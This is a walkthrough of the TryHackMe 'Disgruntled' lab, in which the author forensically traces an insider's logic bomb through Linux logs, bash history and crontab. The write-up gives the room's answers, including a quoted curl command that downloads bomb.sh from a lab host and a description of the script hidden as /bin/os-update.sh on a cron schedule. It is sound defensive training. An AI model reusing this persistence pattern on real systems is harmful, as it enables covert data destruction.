**<p align="center">TryHackMe: Disgruntled</p>**
---

<p align="center">
<img
src="https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Room%20Icon.png" alt="image alt" width="140" />
</p>

**Topic:** Incident Response

**Completed:** 9/2/2025

**Objective:** Use your Linux forensics knowledge to investigate an incident and check if anything malicious has been done to any of CyberT’s assets.

<p align="center">+++++++++</p>

## <p align="center">Task 1: Introduction</p>

“Hey, kid! Good, you’re here!

Not sure if you’ve seen the news, but an employee from the IT department of one of our clients (CyberT) got arrested by the police. The guy was running a successful phishing operation as a side gig.

CyberT wants us to check if this person has done anything malicious to any of their assets. Get set up, grab a cup of coffee, and meet me in the conference room.
“

**Q1:** Grab a cup of coffee.

## <p align="center">Task 2: Linux Forensics review</p>

This is the cheat sheet PDF that will be used to answer the following questions.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%201.png)

**Q2:** Take a sip of coffee.

## <p align="center">Task 3: Nothing suspicious... So far</p>

“Here’s the machine our disgruntled IT user last worked on. Check if there’s anything our client needs to be worried about.
My advice: Look at the privileged commands that were run. That should get you started.”

<p align="center">+++++++++</p>

Curiously, I tried out the `cat /etc/sudoers` command from the cheat sheet to see who can run what commands as root (or another user) via `sudo` and noticed there were three user accounts on the system:

- `root`
- `cybert`
- `it-admin`

🚨 **Important Note:** You should never edit the `/etc/sudoers` file directly with a normal text editor because a syntax error could lock you out of `sudo`. Instead, use:
```
sudo visudo
```
**visudo** is a special command/ wrapper program, designed specifically for safely editing the `/etc/sudoers` file.

It opens `/etc/sudoers` in your system’s default editor, like `nano` or `vi`.

When you save and exit, it checks the file’s syntax before applying changes. If there’s an error, it warns you and won’t save the bad configuration.

This prevents you from accidentally breaking `sudo`, which could lock you out of root access.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%202.png)

**Q3: The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?**

Since the question hinted at the keyword “COMMAND,” I navigated to `/var/log` and searched the `auth.log` file:
```
cat /var/log/auth.log* | grep COMMAND`
```

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%203.png)

Among the data, the `install` command shows the user installed a file named `dokuwiki`.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%204.png)

🇦 ~ `/usr/bin/apt install dokuwiki`

**Q4: What was the present working directory (PWD) when the previous command was run?**

Referring back to the log line, the command was run from:
🇦 ~ `/home/cybert`

## <p align="center">Task 4: Let’s see if you did anything bad</p>

“Keep going. Our disgruntled IT was supposed to only install a service on this computer, so look for commands that are unrelated to that.”

**Q5: Which user was created after the package from the previous task was installed?**

According to `auth.log`, a few minutes after `dokuwiki` was installed, a new user was created using the `adduser` command.

**Note:** `adduser` is a Linux command used to add a new user to the system.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%205.png)

🇦 ~ `it-admin`

**Q6: A user was then later given sudo privileges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)**

The proper way to edit `/etc/sudoers` is `visudo`, and the logs show when it ran.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%206.png)

🇦 ~ `Dec 28 06:27:34`

**Q7: A script file was opened using the "vi" text editor. What is the name of this file?**

Immediately after, the logs show `vi` being used to open a script.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%207.png)

🇦 ~ `bomb.sh`


## <p align="center">Task 5: Bomb has been planted. But when and where?</p>

“That `bomb.sh` file is a huge red flag! While a file is already incriminating in itself, we still need to find out where it came from and what it contains. The problem is that the file does not exist anymore.”

**Q8: What is the command used that created the file `bomb.sh`?**

Navigating to the `it-admin` user’s `/home` directory and running `ls -la` revealed the hidden `.bash_history` file. The history shows how the script was pulled down.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%208.png)

🇦 ~ `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

**Q9: The file was renamed and moved to a different directory. What is the full path of this file now?**

The hidden `.viminfo` file stores past Vim session info (command history, search history, file marks, etc.). It revealed what the file was renamed to.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%209.png) 

🇦 ~ `/bin/os-update.sh`

**Q10: When was the file from the previous question last modified? (Format: Month Day HH:MM)**

Since:
```
ls -l /bin/os-update.sh
```
only shows a quick summary of the file’s permissions, owner, and modification time, I used:
```
stat /bin/os-update.sh
```
to get the full metadata breakdown.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%2010.png)

🇦 ~ `Dec 28 06:29`

**Q11: What is the name of the file that will get created when the file from the first question executes?**

Viewing the contents with `cat` revealed the planned file.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%2011.png)

🇦 ~ `goodbye.txt`

## <p align="center">Task 6: Following the fuse</p>

“So we have a file and a motive. The question we now have is: how will this file be executed?

Surely, he wants it to execute at some point?”

**Q12: At what time will the malicious file trigger? (Format: HH:MM AM/PM)**

This is time-based, so I checked the system-wide crontab:
```
cat /etc/crontab
```
Unlike per-user crontabs (crontab -e), `/etc/crontab` is global and can run tasks as different users. According to the layout, timing is set in minutes and hours, and since the hours are in 24-hour format, an entry like `0 8 * * *` translates to 08:00 AM.

![Alt text](https://github.com/chaiexe/TryHackMe-Write-ups/blob/main/Blue-Team/Disgruntled/Images/Screenshot%2012.png)

🇦 ~ `08:00 AM`

## <p align="center">Task 7: Conclusion</p> 

“Thanks to you, we now have a good idea of what our disgruntled IT person was planning.

We know that he had downloaded a previously prepared script into the machine, which will delete all the files of the installed service if the user has not logged in to this machine in the last 30 days. It’s a textbook example of a  “logic bomb”, that’s for sure.

Look at you, second day on the job, and you’ve already solved 2 cases for me. Tell Sophie I told you to give you a raise.”

**Q13: I’m kidding, of course! But you did good, kid.**

<p align="center">Mission complete!</p>

<p align="center">+++++++++</p>

### Lessons Learned

This lab taught me valuable places to look when searching for investigative data and helped me make better use of the `grep` command to work smarter, not harder. It also showed me how handy log files can be and reminded me to always check hidden files, especially `.bash_history` and `.viminfo`.

<p align="center">+++++++++</p>

🔒 Out of respect for the learning experience, I’ve chosen not to share the flag answers directly. Instead, I’ve documented my full process to support both others and myself in understanding the vulnerability.

**Resources**
- [TryHackMe’s Disgruntled Room](https://tryhackme.com/room/disgruntled)
